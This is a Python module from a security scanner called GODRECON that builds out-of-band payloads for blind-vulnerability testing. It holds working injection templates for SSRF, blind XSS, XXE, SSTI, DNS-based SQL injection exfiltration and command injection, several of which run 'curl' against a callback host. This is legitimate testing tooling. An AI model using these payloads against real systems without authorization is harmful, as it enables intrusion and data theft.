"""Out-of-Band (OOB) Detection module for GODRECON.

Generates unique OOB interaction tokens and payloads for blind
vulnerability detection (SSRF, XSS, SQLi, XXE).  Supports optional
integration with interactsh for real callback verification.
"""

from __future__ import annotations

import asyncio
import hashlib
import time
import uuid
from typing import Any, Dict, List, Optional

from godrecon.core.config import Config
from godrecon.modules.base import BaseModule, Finding, ModuleResult
from godrecon.utils.http_client import AsyncHTTPClient
from godrecon.utils.logger import get_logger

logger = get_logger(__name__)

# Default interactsh public server (can be overridden via config)
_DEFAULT_INTERACTSH_SERVER = "oast.pro"

# OOB payload templates
_SSRF_PAYLOADS = [
    "http://{oob_host}/ssrf/{token}",
    "https://{oob_host}/ssrf/{token}",
    "http://{oob_host}",
]

_BLIND_XSS_PAYLOADS = [
    """<script src="http://{oob_host}/xss/{token}"></script>""",
    """"><img src="http://{oob_host}/xss/{token}" onerror="this.src">""",
    """javascript:fetch('http://{oob_host}/xss/{token}')""",
]

_DNS_SQLI_PAYLOADS = [
    "' AND LOAD_FILE(CONCAT('\\\\\\\\',({query}),'.{oob_host}\\\\share\\\\a'))-- -",
    "' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,({query}),0x2e{oob_hex},0x5c61))-- -",
]

_XXE_PAYLOADS = [
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_host}/xxe/{token}">]><foo>&xxe;</foo>""",
]

_SSTI_PAYLOADS = [
    "{{request.application.__globals__.__builtins__.__import__('os').popen('curl http://{oob_host}/ssti/{token}').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('curl http://{oob_host}/ssti/{token}')}",
]

_CMDI_PAYLOADS = [
    "; curl http://{oob_host}/cmdi/{token};",
    "| curl http://{oob_host}/cmdi/{token}",
    "`curl http://{oob_host}/cmdi/{token}`",
    "$(curl http://{oob_host}/cmdi/{token})",
]


def _generate_token(target: str, payload_type: str) -> str:
    """Generate a unique, traceable OOB interaction token."""
    raw = f"{target}:{payload_type}:{uuid.uuid4()}:{time.time()}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]


def _build_oob_host(base_server: str, token: str) -> str:
    """Build a unique per-token OOB hostname."""
    return f"{token}.{base_server}"


class OOBModule(BaseModule):
    """Generate OOB payloads for blind vulnerability detection."""

    name = "oob"
    description = "Generates OOB interaction payloads for blind SSRF, XSS, SQLi, and command injection"
    author = "GODRECON Team"
    version = "1.0.0"
    category = "oob"

    async def _execute(self, target: str, config: Config) -> ModuleResult:
        result = ModuleResult(module_name=self.name, target=target)

        # Determine OOB server
        oob_server = _DEFAULT_INTERACTSH_SERVER
        # Allow override via general config (if custom field present) or environment
        general = config.general
        proxy = general.proxy
        timeout = general.timeout
        user_agents = general.user_agents

        # Try to register with interactsh if available
        interactsh_url: Optional[str] = None
        interaction_id: Optional[str] = None
        try:
            async with AsyncHTTPClient(
                timeout=5,
                user_agents=user_agents,
                proxy=proxy,
                verify_ssl=True,
                retries=0,
            ) as http:
                interactsh_url, interaction_id = await self._register_interactsh(
                    http, oob_server
                )
        except Exception as exc:
            logger.debug("Interactsh registration skipped: %s", exc)

        if interactsh_url:
            oob_server = interactsh_url
            logger.info("OOB using interactsh host: %s", oob_server)
        else:
            logger.info(
                "OOB using mock payloads — configure interactsh for real callbacks. Server: %s",
                oob_server,
            )

        # Generate payloads for each type
        payload_types = {
            "SSRF": _SSRF_PAYLOADS,
            "Blind XSS": _BLIND_XSS_PAYLOADS,
            "Blind Command Injection": _CMDI_PAYLOADS,
            "XXE": _XXE_PAYLOADS,
            "SSTI": _SSTI_PAYLOADS,
        }

        all_payloads: Dict[str, List[str]] = {}
        for ptype, templates in payload_types.items():
            token = _generate_token(target, ptype)
            oob_host = _build_oob_host(oob_server, token)
            oob_hex = oob_host.encode().hex()
            generated = []
            for tmpl in templates:
                try:
                    payload = tmpl.format(
                        oob_host=oob_host,
                        token=token,
                        oob_hex=oob_hex,
                        query="SELECT version()",
                    )
                    generated.append(payload)
                except KeyError:
                    generated.append(tmpl)
            all_payloads[ptype] = generated

            result.findings.append(
                Finding(
                    title=f"OOB payload generated: {ptype}",
                    description=(
                        f"Out-of-band payloads generated for {ptype} testing on {target}.\n"
                        f"OOB host: {oob_host}\nToken: {token}\n\n"
                        f"Inject these payloads into input fields and monitor {oob_host} for callbacks.\n\n"
                        f"Payloads:\n" + "\n".join(f"  {i+1}. {p}" for i, p in enumerate(generated))
                    ),
                    severity="info",
                    data={
                        "target": target,
                        "payload_type": ptype,
                        "oob_host": oob_host,
                        "token": token,
                        "payloads": generated,
                        "interactsh_registered": interactsh_url is not None,
                    },
                    tags=["oob", "blind", ptype.lower().replace(" ", "-")],
                    evidence=oob_host,
                    source_module=self.name,
                )
            )

        result.raw = {
            "oob_server": oob_server,
            "interactsh_registered": interactsh_url is not None,
            "interaction_id": interaction_id,
            "payload_types": list(payload_types.keys()),
            "all_payloads": all_payloads,
        }
        logger.info(
            "OOB module complete — %d payload types generated for %s",
            len(payload_types),
            target,
        )
        return result

    @staticmethod
    async def _register_interactsh(
        http: AsyncHTTPClient, server: str
    ) -> tuple[Optional[str], Optional[str]]:
        """Attempt to register with an interactsh server.

        Returns (oob_host, correlation_id) or (None, None) on failure.
        """
        register_url = f"https://{server}/register"
        try:
            resp = await http.get(register_url, allow_redirects=False)
            if resp and resp.get("status") == 200:
                data = resp.get("json") or {}
                corr_id = data.get("correlation-id") or data.get("id")
                if corr_id:
                    return f"{corr_id}.{server}", corr_id
        except Exception:
            pass
        return None, None
